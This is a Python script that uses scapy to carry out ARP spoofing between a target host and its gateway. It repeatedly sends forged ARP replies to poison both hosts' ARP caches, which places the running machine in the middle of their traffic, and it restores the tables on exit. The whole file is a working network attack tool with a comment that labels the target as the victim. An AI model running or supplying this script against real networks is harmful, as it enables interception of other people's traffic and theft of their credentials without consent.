#!/usr/bin/ python

import scapy.all as scapy
import time
import sys
import argparse
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP / IP range.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP / IP range.")

    options = parser.parse_args()
    return options

def give_mac_ip(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broad_arp_rqst = broadcast/arp_request
    #using [0] as there should be 2 parameter but we are using only 1 i.e. answered_list.
    answered_list = scapy.srp(broad_arp_rqst, timeout=1, verbose=False)[0]

    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):

    target_mac = give_mac_ip(target_ip)
    # --> sending packet to victim/router
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore_arp_table(destination_ip, source_ip):

        target_mac = give_mac_ip(source_ip)
        source_mac = give_mac_ip(destination_ip)
        packet = scapy.ARP(op=2, pdst = source_ip, hwdst = target_mac, psrc = destination_ip, hwsrc = source_mac)
        scapy.send(packet, verbose=False)

packet_counter = 0
options = get_arguments()
# target = "192.168.154.147"
# gateway = "192.168.154.2"
try:
    while True:
    # give_mac_ip("192.168.154.2")
    # --> spoofing victim
        spoof(options.target, options.gateway)
    # --> spoofing access point/router
        spoof(options.gateway, options.target)
        packet_counter = packet_counter + 2
        print("\r[+] Packets sent: " + str(packet_counter),end=' ')
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C --> exiting the program\n Resetting ARP Table.")
    time.sleep(4)
    # --> Resetting ARP Table of Victim upon pressing of  CTRL + C
    restore_arp_table(options.target, options.gateway)
    # --> Resetting ARP Table of Router upon pressing of  CTRL + C
    restore_arp_table(options.gateway, options.target)